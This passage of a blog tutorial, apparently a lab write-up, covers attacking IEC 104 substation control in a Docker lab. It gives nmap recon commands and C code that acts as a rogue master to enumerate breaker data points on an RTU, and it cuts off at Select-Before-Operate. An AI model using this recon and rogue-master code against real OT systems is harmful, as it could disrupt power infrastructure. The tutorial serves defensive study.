---
title: "OT Security: IEC 104 Attack and Defend"
header:
  teaser: /assets/images/iec104.png
  teaser_home_page: true
categories:
  - OT Security
classes: wide
tags:
  - OT-Security
toc: true
toc_label: Contents
---
## Objective ##

In the ever-evolving landscape of cyber threats, let us have a look at a rapidly developing domain in cyber-security; Operational Technology (OT) Security. In this post, we will be engaging in an attack and defend exercise targeting IEC 104—a communication protocol used by various types of OT/ICS systems.

## Threats towards OT Systems - A Quick Introduction

In order for us to understand the importance of OT security and the ever-growing threat landscape, let's take a look at a geo-political cyber-warfare case.

During the Russia-Ukraine war, [Mandiant](https://cloud.google.com/blog/topics/threat-intelligence/sandworm-disrupts-power-ukraine-operational-technology/) documented a coordinated cyber campaign by Russian state-sponsored threat groups. A key aggressor in this campaign was an APT tracked as Sandworm (a.k.a APT44), which has been attributed to Russian intelligence (GRU).

Sandworm utilized custom OT/ICS malware, namely INDUSTROYER.V2, to perform targeted attacks on Ukraine energy infrastructure. These attacks were coordinated with physical missile and drone attacks on substations to increase damage and gain tactical advantage, especially since this war was going on during the winters.

This case, among many, shows the rapid evolution of OT threats and how they fit into the bigger pictures such as cyberwarfare. It also highlights the importance of shifting our glance as an industry to securing these OT/ICS systems in order to ensure that critical infrastructure stays secure and provides continuous services during wars and other disturbances.

![Source: Mandiant Blog](/assets/images/mandiant_ot.png)

## IEC 104 - Overview

IEC 104 (IEC-60870-5-104) is a communication protocol and standard that is utilized by many types of OT/ICS and SCADA systems, especially those that are a part of energy and power infrastructure. 

It facilitates remote control and monitoring over TCP/IP and is usually used for connecting control centers (client/master) to RTU/IEDs and substations (server/slave). Using this protocol, several data points such as breaker status, tank levels, etc. can be monitored, ingested, and controlled.

To set the stage, **Sandworm** used **Industroyer2** to directly target the **IEC-60870-5-104 (IEC-104)** protocol, which was actively used by Ukrainian electrical substations at the time. The malware was designed to issue **legitimate breaker open commands** to electrical distribution equipment, temporarily cutting power in targeted areas. 

The objective was to **disrupt civilian and critical infrastructure**, including medical services, and to **apply psychological and societal pressure** during wartime conditions. These cyber operations were **temporally coordinated with kinetic attacks**, such as missile strikes and shelling against energy infrastructure, in order to **amplify disruption and complicate grid restoration efforts**.

IEC 60870-5-104 remains widely deployed across energy and other OT environments today, and because its core design predates modern security models, advanced threat actors can still exploit inherent trust assumptions at the protocol level—even when transport protections like TLS are implemented.

## Target Lab Setup and Objective

To simulate this attack to a near-accurate extent, I have created a lab which can be found at my [repository for OT Security projects](https://github.com/4p0cryph0n/otsec). It is constructed using Docker, and has the following components:

- **IEC-104 RTU** - I have modified a well-known and well-built IEC-104 simulator project called [J60870](https://www.openmuc.org/iec-60870-5-104/download/) to contain features that real-world outstations (RTUs) have, such as Select-Before-Operate (SBO) control logic and real-time breaker state changes in order to better understand how these attacks impact real-world RTUs.
- **IEC-104 Master** - The master/client that comes with the J60870 simulator modified to support our RTU. This is present to understand the role of a master/SCADA server and how it communicates with an RTU by default.
- **Engineering workstation** - An engineering workstation on the same network   as the IEC-104 RTU and master. This is an Ubuntu box assumed to be breached by the threat actor, where the attacks will launch from. We will get into how this falls in the overall attack flow later. This workstation also contains the [lib60870-C](https://github.com/mz-automation/lib60870) library to facilitate on-the-fly malware development.

Also, I've setup a Docker network known as ``ot_net`` using the below command:
```bash
docker network create --subnet 172.30.0.0/24 ot_net
```

Then I went ahead assigned IPs to each of these machines based on its subnet. Feel free to change the `Dockerfile` for the containers in case you change the subnet. Each of the containers come with their respective build instructions. Y'all can recreate this lab locally and walkthrough the attack exercise as mentioned below. With that being said, let's dive right in!

## Attack Overview

So the attack scenario is as follows:
- We are simulating a threat actor that has breached an IEC-104 engineering workstation that resides on the same network as an IEC-104 outstation and master. 
- The threat actor uses the engineering workstation as a rogue master, taking advantage of the inherent trust of IEC-104 wherein multiple masters on the same network are able to communicate with an outstation (we assume that there aren't any security measures apart from network segmentation in place to prevent this kind of an attack).

![](/assets/images/roguemaster.png)

## Target Reconnaissance

From the breached engineering machine, lets assume that the threat actor has already scanned the OT network and knows the IPs of the RTU and the connected master. The attacker is able to load `nmap` on the machine, and starts recon. First, let's scan all ports to figure out which port on the RTU is running the iec-104 service:

```sh
otuser@a8f0b6ff9c14:~$ nmap -p- -Pn 172.30.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-04 06:57 UTC
Nmap scan report for server.ot_net (172.30.0.2)
Host is up (0.000038s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
2404/tcp open  iec-104

Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```

From the output, we can see that the service `iec-104` is running on port `2404`, which is the default port. But this only confirms that the service is running. In order to interact with it, we need to go through a master that is connected to the RTU.

Each IEC-104 RTU has something known as an  Application Service Data Unit (ASDU) common address, which is its identity in relation to other RTUs and what masters will use to reach and communicate with it.

>An Application Service Data Unit (ASDU) is a message wrapper that facilitates communication and the transmission of data points between a Remote Terminal Unit (RTU) and the master.  Each RTU has a common address, known as an ASDU Common Address which is unique to it.

`nmap` has a neat script to discover these ASDU addresses, which is called `iec-identify.nse`. Let's utilize this:

```sh
otuser@a8f0b6ff9c14:~$ nmap 172.30.0.2 -Pn -p 2404 --script iec-identify.nse
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-04 07:34 UTC
Nmap scan report for server.ot_net (172.30.0.2)
Host is up (0.000072s latency).

PORT     STATE SERVICE
2404/tcp open  iec-104
| iec-identify: 
|   ASDU address: 65535
|_  Information objects: 3

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

The output shows one ASDU address associated with the master, which is `65535` and will come in handy during further stages of the attack. Another notable observation is the number of information objects.

>An Information Object is a data point that is contained within an ASDU. Information Objects relay a variety of information from the master, for example, breaker status, sensor readings, etc. 

>Each Information Object has an Information Object Address (IOA), which is the address of the data point within the ASDU. Along with the IOA, the value of each data point can also be observed.

### IOA Discovery

Let's conduct our second-stage reconnaissance, in which we will now focus on discovering the various Information Objects and their respective addresses to pick our targets for manipulation.

For us to manipulate a particular information object, we need to discover its respective Information Object Address (IOA), which is the identity of an information object connected to an RTU. A master will use this IOA to interact with that particular information object, which is a digital identity for something physical like a breaker, tank sensor, etc. 

#### IOA Discovery Script

Using the neat [lib60870-C](https://github.com/mz-automation/lib60870) library, we can write a program to perform discovery and enumeration of the various information objects connected with the RTU. This is the same as running a General Interrogation command from a master, but why we are writing this script is because we are assuming that the attacker does not have access to the legitimate master connected to the RTU, so they are trying to use the compromised engineering workstation as a master.

```c
/*
 * Author: 4p0cryph0n
 *
 * This file is part of an educational OT/ICS laboratory for studying
 * IEC 60870-5-104 attack vectors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This software is provided for educational and defensive security
 * research purposes only.
 */


#include "cs104_connection.h"
#include "hal_thread.h"
#include "hal_time.h"

#include <stdio.h>
#include <stdlib.h>

static int running = 1;

static void
connectionHandler(void* parameter, CS104_Connection connection, CS104_ConnectionEvent event)
{
    switch (event) {
        case CS104_CONNECTION_OPENED:
            printf("[+] Connection established\n");
            break;
        case CS104_CONNECTION_CLOSED:
            printf("[-] Connection closed\n");
            running = 0;
            break;
        case CS104_CONNECTION_FAILED:
            printf("[-] Connection failed\n");
            running = 0;
            break;
        default:
            break;
    }
}

static bool
asduHandler(void* parameter, int address, CS101_ASDU asdu)
{
    TypeID type = CS101_ASDU_getTypeID(asdu);

    printf("[>] Received ASDU: Type=%s (%d), Elements=%d\n",
        TypeID_toString(type),
        type,
        CS101_ASDU_getNumberOfElements(asdu));
        
    if (type == C_IC_NA_1) {
        CS101_CauseOfTransmission cot = CS101_ASDU_getCOT(asdu);

        if (cot == CS101_COT_ACTIVATION_CON)
            printf("    [GI Activation Confirmation]\n");
        else if (cot == CS101_COT_ACTIVATION_TERMINATION)
            printf("    [GI Termination]\n");
        else
            printf("    [GI Other COT: %d]\n", cot);

        return true;  // Skip IOA printing for GI
    }

    switch (type) {

        case M_SP_NA_1: // Single point
            for (int i = 0; i < CS101_ASDU_getNumberOfElements(asdu); i++) {
                SinglePointInformation spi = (SinglePointInformation) CS101_ASDU_getElement(asdu, i);
                printf("    IOA: %d | Type: M_SP_NA_1 | Value: %d\n",
                    InformationObject_getObjectAddress((InformationObject) spi),
                    SinglePointInformation_getValue(spi));
                InformationObject_destroy((InformationObject) spi);
            }
            break;

        case M_DP_NA_1: // Double point
            for (int i = 0; i < CS101_ASDU_getNumberOfElements(asdu); i++) {
                DoublePointInformation dpi = (DoublePointInformation) CS101_ASDU_getElement(asdu, i);
                printf("    IOA: %d | Type: M_DP_NA_1 | Value: %d\n",
                    InformationObject_getObjectAddress((InformationObject) dpi),
                    DoublePointInformation_getValue(dpi));
                InformationObject_destroy((InformationObject) dpi);
            }
            break;

        case M_ME_NB_1: // Scaled measured value
            for (int i = 0; i < CS101_ASDU_getNumberOfElements(asdu); i++) {
                MeasuredValueScaled mvs = (MeasuredValueScaled) CS101_ASDU_getElement(asdu, i);
                printf("    IOA: %d | Type: M_ME_NB_1 | Value: %d\n",
                    InformationObject_getObjectAddress((InformationObject) mvs),
                    MeasuredValueScaled_getValue(mvs));
                InformationObject_destroy((InformationObject) mvs);
            }
            break;

        case M_ME_NC_1: // Short float measured value
            for (int i = 0; i < CS101_ASDU_getNumberOfElements(asdu); i++) {
                MeasuredValueShort mvs = (MeasuredValueShort) CS101_ASDU_getElement(asdu, i);
                printf("    IOA: %d | Type: M_ME_NC_1 | Value: %.2f\n",
                    InformationObject_getObjectAddress((InformationObject) mvs),
                    MeasuredValueShort_getValue(mvs));
                InformationObject_destroy((InformationObject) mvs);
            }
            break;

        default:
            printf("    [Unsupported ASDU type: %d]\n", type);
            break;
    }

    return true;
}



int main(void)
{
    const char* ip = "172.30.0.2";
    int port = 2404;
    int asdu = 65535;

    printf("[*] Connecting to %s:%d (ASDU %d)\n", ip, port, asdu);

    CS104_Connection con = CS104_Connection_create(ip, port);

    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);
    CS104_Connection_setASDUReceivedHandler(con, asduHandler, NULL);

    if (CS104_Connection_connect(con)) {
        CS104_Connection_sendStartDT(con);

        Thread_sleep(500);

        printf("[>] Sending general interrogation (C_IC_NA_1)...\n");
        CS104_Connection_sendInterrogationCommand(con, CS101_COT_ACTIVATION, asdu, IEC60870_QOI_STATION);

        Thread_sleep(5000);
    } else {
        printf("[-] Failed to connect to target\n");
    }

    CS104_Connection_destroy(con);
    return 0;
}

```

In this script, I have accounted for the most common Information Object types, the explanations for which you can find below:

| **Case**    | **Type ID** | **IEC 104 Name**                  | **Meaning**                                                     | **What the code does**                       |
| ----------- | ----------- | --------------------------------- | --------------------------------------------------------------- | -------------------------------------------- |
| `C_IC_NA_1` | 100         | General Interrogation Command     | Request or indication to get all current values from a device   | Prints IOA + “General Interrogation Command” |
| `M_SP_NA_1` | 1           | Single Point Information          | Boolean on/off status of a single device (e.g., breaker)        | Prints IOA + value (`0=off`, `1=on`)         |
| `M_DP_NA_1` | 3           | Double Point Information          | Two-bit state info (e.g., intermediate, on, off, indeterminate) | Prints IOA + DPI value                       |
| `M_ME_NB_1` | 11          | Measured Value, Scaled Integer    | Analog value represented as a scaled integer                    | Prints IOA + integer value                   |
| `M_ME_NC_1` | 13          | Measured Value, Short Floating Pt | Analog value represented as 32-bit IEEE 754 float               | Prints IOA + float value                     |
| **default** | —           | Unknown/Other                     | Any unhandled ASDU type                                         | Prints IOA + “Unparsed type”                 |

The script can be compiled as such:
```sh
otuser@a8004a5c456a:~$ gcc enum.c -o enum -I'/opt/lib60870/lib60870-C/src/hal/inc' -L '/opt/lib60870/lib60870-C/build/' /opt/lib60870/lib60870-C/build/src/liblib60870.a
```

Running the script, we get an output of all the available Information Objects associated with this Application Service Data Unit (ASDU):

```sh
otuser@a8004a5c456a:~$ ./enum
[*] Connecting to 172.30.0.2:2404 (ASDU 65535)
[+] Connection established
[>] Sending general interrogation (C_IC_NA_1)...
[>] Received ASDU: Type=C_IC_NA_1 (100), Elements=1
    [GI Activation Confirmation]
[>] Received ASDU: Type=M_SP_NA_1 (1), Elements=3
    IOA: 1001 | Type: M_SP_NA_1 | Value: 1
    IOA: 1002 | Type: M_SP_NA_1 | Value: 1
    IOA: 1003 | Type: M_SP_NA_1 | Value: 0
[>] Received ASDU: Type=C_IC_NA_1 (100), Elements=1
    [GI Termination]
[-] Connection closed
```

Corresponding the results with the different types of information objects, we can see that the type of the three outputted IOAs are `M_SP_NA_1`, which hold Single Point Information storing Boolean data. This could indicate that these information objects are associated with breakers or switches.

### Taking a step back - Understanding how IEC-104 Works

For a moment, lets step outside the attacker's shoes, and understand how IEC-104 really works on a technical level. Let's fire up the legitimate `client` container and understand how an IEC-104 handles requests.

When you fire up the legitimate master, you will be presented with the following console:

```bash
2026.01.07 05:59:53.695 Send STARTDT (try 1)
2026.01.07 05:59:53.698 Data transfer started
2026.01.07 05:59:53.698 Successfully connected

------------------------------------------------------
 i - interrogation C_IC_NA_1
 ci - counter interrogation C_CI_NA_1
 c - synchronize clocks C_CS_NA_1
 s - single command SELECT (SBO)
 e - single command EXECUTE (SBO)
 p - STOPDT act
 t - STARTDT act
 h - print help message
 q - quit the application
------------------------------------------------------

** Enter action key: 
```

The script that we wrote basically sends out a General Interrogation command, or `i` in this case. You can see that it returns the same information:

```sh
** Enter action key: 
i
2026.01.07 07:27:39.952 ** Sending general interrogation

** Enter action key: 
2026.01.07 07:27:39.960 
Received ASDU:
ASDU Type: 100, C_IC_NA_1, Interrogation command
Cause of transmission: ACTIVATION_CON, test: false, negative con: false
Originator address: 0, Common address: 65535
IOA: 0
Qualifier of interrogation: 20
2026.01.07 07:27:40.006 
Received ASDU:
ASDU Type: 1, M_SP_NA_1, Single-point information without time tag
Cause of transmission: INTERROGATED_BY_STATION, test: false, negative con: false
Originator address: 0, Common address: 65535
IOA: 1001
Single Point, is on: true, blocked: false, substituted: false, not topical: false, invalid: false
IOA: 1002
Single Point, is on: true, blocked: false, substituted: false, not topical: false, invalid: false
IOA: 1003
Single Point, is on: false, blocked: false, substituted: false, not topical: false, invalid: false
2026.01.07 07:27:40.007 
Received ASDU:
ASDU Type: 100, C_IC_NA_1, Interrogation command
Cause of transmission: ACTIVATION_TERMINATION, test: false, negative con: false
Originator address: 0, Common address: 65535
IOA: 0
Qualifier of interrogation: 20
```

Now let's say for example we want to change the state of breaker 3 (`IOA: 1003`) from off (`0`) to on (`1`) . For that, a no-brainer would be to run the ` e - single command EXECUTE (SBO)` command right? So let's go ahead and do that:

```sh
** Enter action key: 
e
2026.01.07 07:47:43.758 Enter breaker IOA (e.g. 1001, 1002, 1003):
1003
2026.01.07 07:47:47.684 Enter state (1 = CLOSE / ON, 0 = OPEN / OFF):
1
2026.01.07 07:48:07.676 ** EXECUTE breaker IOA=1003 state=CLOSE

** Enter action key: 
2026.01.07 07:48:07.681 
Received ASDU:
ASDU Type: 45, C_SC_NA_1, Single command
Cause of transmission: ACTIVATION_CON, test: false, negative con: false
Originator address: 0, Common address: 65535
IOA: 1003
Single Command state on: true, selected: false, qualifier: 0
```

We see that the output reflects on state as true, so let's cross-check with a general interrogation:

```sh
i
2026.01.07 07:49:17.860 ** Sending general interrogation

** Enter action key: 
2026.01.07 07:49:17.863 
Received ASDU:
ASDU Type: 100, C_IC_NA_1, Interrogation command
Cause of transmission: ACTIVATION_CON, test: false, negative con: false
Originator address: 0, Common address: 65535
IOA: 0
Qualifier of interrogation: 20
2026.01.07 07:49:17.864 
Received ASDU:
ASDU Type: 1, M_SP_NA_1, Single-point information without time tag
Cause of transmission: INTERROGATED_BY_STATION, test: false, negative con: false
Originator address: 0, Common address: 65535
IOA: 1001
Single Point, is on: true, blocked: false, substituted: false, not topical: false, invalid: false
IOA: 1002
Single Point, is on: true, blocked: false, substituted: false, not topical: false, invalid: false
IOA: 1003
Single Point, is on: false, blocked: false, substituted: false, not topical: false, invalid: false
2026.01.07 07:49:17.864 
Received ASDU:
ASDU Type: 100, C_IC_NA_1, Interrogation command
Cause of transmission: ACTIVATION_TERMINATION, test: false, negative con: false
Originator address: 0, Common address: 65535
IOA: 0
Qualifier of interrogation: 20
```

Huh? That's odd. The state of the breaker did not change. That is because we are missing a crucial command sequence which is implemented for safety in SCADA systems.
#### Select-before-Operate (SBO)

In order to prevent accidental 